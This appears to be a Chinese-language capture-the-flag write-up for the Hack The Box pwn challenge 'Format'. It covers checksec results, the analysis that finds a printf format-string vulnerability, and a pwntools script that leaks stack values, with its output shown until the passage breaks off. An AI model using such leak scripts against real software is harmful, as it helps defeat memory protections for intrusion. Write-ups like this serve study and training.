@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="详细过程及exp - 1与任何二进制利用挑战一样，首先在二进制文件上运行checksec，以查看启用了哪种保护。 12345678┌──(root💀kali)-[~&#x2F;hackthebox&#x2F;challenge&#x2F;pwn&#x2F;format]└─# checksec format[*] &amp;#x27;&#x2F;root&#x2F;hackthebox&#x2F;challenge&#x2F;pwn&#x2F;format&#x2F;format&amp;#x27;    A">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-pwn-challenge[Format]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/01/12/format/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="详细过程及exp - 1与任何二进制利用挑战一样，首先在二进制文件上运行checksec，以查看启用了哪种保护。 12345678┌──(root💀kali)-[~&#x2F;hackthebox&#x2F;challenge&#x2F;pwn&#x2F;format]└─# checksec format[*] &amp;#x27;&#x2F;root&#x2F;hackthebox&#x2F;challenge&#x2F;pwn&#x2F;format&#x2F;format&amp;#x27;    A">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format10.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format11.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format12.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format13.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format14.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format15.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format16.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format17.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format18.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format19.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format20.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format21.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format22.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format23.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format24.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format25.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format26.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format27.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format28.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format29.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format30.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format31.jpg">
+<meta property="article:published_time" content="2021-01-12T01:04:56.000Z">
+<meta property="article:modified_time" content="2021-09-02T11:31:06.965Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format10.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/01/12/format/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/01/12/format/","path":"2021/01/12/format/","title":"Hack-The-Box-pwn-challenge[Format]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-pwn-challenge[Format] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B%E5%8F%8Aexp-1"><span class="nav-number">1.</span> <span class="nav-text">详细过程及exp - 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B%E5%8F%8Aexp-2"><span class="nav-number">2.</span> <span class="nav-text">详细过程及exp - 2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Basic-checks"><span class="nav-number">2.1.</span> <span class="nav-text">1. Basic checks:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Run-binary-with-format-string-as-input-and-spot-the-vulnerability"><span class="nav-number">2.2.</span> <span class="nav-text">2. Run binary with format string as input and spot the vulnerability:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Disassemble-binary-with-your-favorite-disassembler"><span class="nav-number">2.3.</span> <span class="nav-text">3. Disassemble binary with your favorite disassembler:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-General-overview-of-what-is-being-leaked"><span class="nav-number">2.4.</span> <span class="nav-text">4. General overview of what is being leaked:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Run-binary-in-GDB-%E2%80%94-defeating-PIE"><span class="nav-number">2.5.</span> <span class="nav-text">5. Run binary in GDB — defeating PIE:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Leak-the-printf-address-from-libc-through-printf"><span class="nav-number">2.6.</span> <span class="nav-text">6. Leak the __printf address from libc through printf():</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-Check-the-libc-version-on-the-remote-system"><span class="nav-number">2.7.</span> <span class="nav-text">7. Check the libc version on the remote system</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-Taking-control-of-execution-flow"><span class="nav-number">2.8.</span> <span class="nav-text">8. Taking control of execution flow:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-Calculating-necessary-addresses"><span class="nav-number">2.9.</span> <span class="nav-text">8. Calculating necessary addresses:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-Final-exploit"><span class="nav-number">2.10.</span> <span class="nav-text">9. Final exploit:</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/01/12/format/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-pwn-challenge[Format] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-pwn-challenge[Format]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-01-12 09:04:56" itemprop="dateCreated datePublished" datetime="2021-01-12T09:04:56+08:00">2021-01-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-09-02 19:31:06" itemprop="dateModified" datetime="2021-09-02T19:31:06+08:00">2021-09-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="详细过程及exp-1"><a href="#详细过程及exp-1" class="headerlink" title="详细过程及exp - 1"></a>详细过程及exp - 1</h2><p>与任何二进制利用挑战一样，首先在二进制文件上运行checksec，以查看启用了哪种保护。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]</span><br><span class="line">└─<span class="comment"># checksec format</span></span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/challenge/pwn/format/format&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>我们发现NX, Full RELRO和PIE都是启用的。进一步发现了堆栈Canary的存在。NX被启用意味着不能执行堆栈的内容。启用PIE意味着每次在新进程中生成二进制数据时，都会为该二进制数据选择一个新的基址。Full RELRO意味着不能修改get部分的内容。打开IDA中的二进制文件并分析它，以了解它的功能。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format10.jpg"></li>
+</ul>
+<p>main函数分别调用init和echo两个函数。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format11.jpg"></li>
+</ul>
+<p>echo函数分别调用偏移量0x10a0和偏移量0x1090的两个函数。PLT部分似乎已被剥离或损坏，因此无法看到确切的函数名。但是，可以查看二进制文件的导入，并做出有根据的猜测。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format12.jpg"></li>
+</ul>
+<p>查看导入表，看到它导入了另外两个函数。根据echo函数中每个函数调用的输入参数，假设偏移量为0x10a0的函数是fgets，偏移量为0x1090的函数是printf。因此，二进制代码似乎接受用户输入，并使用printf将用户输入作为字符串格式参数输出。这被认为是危险的，因为用户现在拥有从栈读取或写入的能力。可以通过使用’ %p ‘或’ %s ‘等格式说明符来验证二进制文件存在格式字符串漏洞。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]</span><br><span class="line">└─<span class="comment"># ./format </span></span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">test</span></span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">test</span></span><br><span class="line">%p</span><br><span class="line">0x7f969b0b6a03</span><br><span class="line">%s</span><br></pre></td></tr></table></figure>
+
+<p>从上可以看出，能够使用’ %p ‘泄漏堆栈的一个成员。有趣的是，格式说明符还允许使用格式说明符’ %offset$p ‘来选择堆栈上的偏移量。为了理解它是如何工作的，必须理解printf是如何工作的。</p>
+<p>printf函数原型是int printf(char const* format，…)，其中的’…’符号描述了一个可变参数。在像C这样的本地语言中，带有可变参数的被调用者不知道有多少参数被赋给了它的参数包。在这个例子中，printf使用format参数来指示需要多少个堆栈参数。用户可能为参数包提供了足够的参数，也可能没有提供足够的参数，但是函数仍然会从堆栈顶部输出给定数量的对象。使用’ offset$ ‘表示法, 可以重用以前在格式字符串中使用的参数，而不需要参数。</p>
+<p>例如，可能有一个字符串，其中一个特定变量要打印两次。现在，可以将参数赋值给参数包两次，或者直接在打印的变量的最后一个实例上使用’ offset$ ‘表示法。下面的例子演示了这两种方法。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, string, string);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s %1<span class="variable">$s</span>&quot;</span>, string);</span><br></pre></td></tr></table></figure>
+
+<p>使用这种技术，可以迭代堆栈的内容。注意，每个偏移量对应一个按二进制位对齐的堆栈元素，即32位为4字节，64位为8字节。</p>
+<ul>
+<li>stack.py</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">s = process(<span class="string">&#x27;./format&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1, 100):</span><br><span class="line">    s.sendline(<span class="string">&#x27;%&#123;&#125;$p &#x27;</span>.format(i).ljust(0x100, <span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;&#123;:2&#125;: &#123;&#125;&quot;</span>.format(i, s.recvline().<span class="built_in">split</span>(<span class="string">&#x27; &#x27;</span>)[0])</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<p>上面显示了一个用于迭代堆栈的简单python脚本。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]</span><br><span class="line">└─<span class="comment"># python stack.py </span></span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./format&#x27;</span>: pid 4567</span><br><span class="line"> 1: 0x7f6b05dcaa03</span><br><span class="line"> 2: (nil)</span><br><span class="line"> 3: 0x7f6b05cfae2e</span><br><span class="line"> 4: 0x7ffcdede77a0</span><br><span class="line"> 5: (nil)</span><br><span class="line"> 6: 0x6161612070243625</span><br><span class="line"> 7: 0x6161616161616161</span><br><span class="line"> 8: 0x6161616161616161</span><br><span class="line"> 9: 0x6161616161616161</span><br><span class="line">10: 0x6161616161616161</span><br><span class="line">11: 0x6161616161616161</span><br><span class="line">12: 0x6161616161616161</span><br><span class="line">13: 0x6161616161616161</span><br><span class="line">14: 0x6161616161616161</span><br><span class="line">15: 0x6161616161616161</span><br><span class="line">16: 0x6161616161616161</span><br><span class="line">17: 0x6161616161616161</span><br><span class="line">18: 0x6161616161616161</span><br><span class="line">19: 0x6161616161616161</span><br><span class="line">20: 0x6161616161616161</span><br><span class="line">21: 0x6161616161616161</span><br><span class="line">22: 0x6161616161616161</span><br><span class="line">23: 0x6161616161616161</span><br><span class="line">24: 0x6161616161616161</span><br><span class="line">25: 0x6161616161616161</span><br><span class="line">26: 0x6161616161616161</span><br><span class="line">27: 0x6161616161616161</span><br><span class="line">28: 0x6161616161616161</span><br><span class="line">29: 0x6161616161616161</span><br><span class="line">30: 0x6161616161616161</span><br><span class="line">31: 0x6161616161616161</span><br><span class="line">32: 0x6161616161616161</span><br><span class="line">33: 0x6161616161616161</span><br><span class="line">34: 0x6161616161616161</span><br><span class="line">35: 0x6161616161616161</span><br><span class="line">36: 0x6161616161616161</span><br><span class="line">37: 0x61616161616161</span><br><span class="line">38: (nil)</span><br><span class="line">39: 0x2a0cd2c9e1808e00</span><br><span class="line">40: 0x7ffcdede78d0</span><br><span class="line">41: 0x55ff366b72b3</span><br><span class="line">42: 0x7ffcdede79c0</span><br><span class="line">43: 0x2a0cd2c9e1808e00</span><br><span class="line">44: 0x55ff366b72d0</span><br><span class="line">45: 0x7f6b05c32d0a</span><br><span class="line">46: 0x7ffcdede79c8</span><br><span class="line">47: 0x100000000</span><br><span class="line">48: 0x55ff366b7284</span><br><span class="line">49: 0x7f6b05c327cf</span><br><span class="line">50: (nil)</span><br><span class="line">51: 0x5bef4ce629faf90f</span><br><span class="line">52: 0x55ff366b70c0</span><br><span class="line">53: (nil)</span><br><span class="line">54: (nil)</span><br><span class="line">55: (nil)</span><br><span class="line">56: 0xfe89d8c3d9af90f</span><br><span class="line">57: 0xec72bb695dcf90f</span><br><span class="line">58: (nil)</span><br><span class="line">59: (nil)</span><br><span class="line">60: (nil)</span><br><span class="line">61: 0x1</span><br><span class="line">62: 0x7ffcdede79c8</span><br><span class="line">63: 0x7ffcdede79d8</span><br><span class="line">64: 0x7f6b05e22180</span><br><span class="line">65: (nil)</span><br><span class="line">66: (nil)</span><br><span class="line">67: 0x55ff366b70c0</span><br><span class="line">68: 0x7ffcdede79c0</span><br><span class="line">69: (nil)</span><br><span class="line">70: (nil)</span><br><span class="line">71: 0x55ff366b70ee</span><br><span class="line">72: 0x7ffcdede79b8</span><br><span class="line">73: 0x1c</span><br><span class="line">74: 0x1</span><br><span class="line">75: 0x7ffcdede8467</span><br><span class="line">76: (nil)</span><br><span class="line">77: 0x7ffcdede8470</span><br><span class="line">78: 0x7ffcdede8488</span><br><span class="line">79: 0x7ffcdede84b8</span><br><span class="line">80: 